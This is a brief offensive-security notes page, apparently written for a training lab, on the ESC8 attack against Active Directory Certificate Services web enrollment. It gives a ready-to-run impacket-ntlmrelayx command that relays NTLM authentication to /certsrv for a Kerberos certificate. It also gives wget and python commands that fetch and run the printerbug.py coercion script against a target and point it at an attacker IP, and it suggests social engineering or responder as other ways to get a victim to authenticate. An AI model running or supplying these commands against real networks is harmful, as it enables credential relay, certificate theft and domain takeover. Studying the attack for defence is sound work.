# ESC8
This is the [`ESC8`](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf) attack. Basically the vulnerable part is that it has ADCS `HTTP` endpoint.

It is vulnerable to NTLM relay attack . Certificate authority web enrollment usually is at `/certsrv`. Now we get the certificate from that CA.

![](/images/0088f156de07b09ffcb79c4ee07a3ae95e494148cacc7a262ca7cae1211a7f53.jpeg)
## Set relay server

```sh
impacket-ntlmrelayx -t http://ca01.inlanefreight.local/certsrv/ --adcs -smb2support --template KerberosAuthentication
```

Use [printer bug](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) script to make the target machine authenticate to our machine. Our machine will then pass the authentication to the CA and get a cert.

Or, you can social engineer, or any other method to make target user to authenticate to us. `responder` could also be a good method

## Printer bug

```sh
wget https://github.com/dirkjanm/krbrelayx/raw/refs/heads/master/printerbug.py
python3 printerbug.py 'domain.name/user:pass@ca-ip' <attacker-ip>
```

After this, you should get a cert, do [Pass the certificate]({{< relref "8. Lateral Movement/ADCS Attacks/_index#pass-the-certificate" >}})